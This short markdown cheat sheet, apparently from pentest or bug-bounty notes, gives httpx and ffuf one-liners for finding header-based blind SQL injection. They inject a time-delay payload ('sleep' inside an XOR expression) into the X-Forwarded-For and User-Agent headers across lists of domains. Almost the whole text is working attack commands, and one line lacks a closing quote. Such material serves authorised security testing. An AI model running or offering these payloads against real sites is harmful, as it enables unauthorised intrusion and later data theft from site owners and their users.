# SQL Injections

## Header-Based Blind SQL Injection
Find Header-Based Blind SQL injection

```bash
#htttpx
cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'

#ffuf

ffuf -w domains.txt -u FUZZ -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z

To avoid false positive, I use this command:

ffuf -w domains.txt -u FUZZ -H "X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z" -c 200 -o json --timeout 6

For wordlist and multiple Headers:

ffuf -w headers.txt -u <target> -H "User-Agent: FUZZ" -c 200 -o json
```
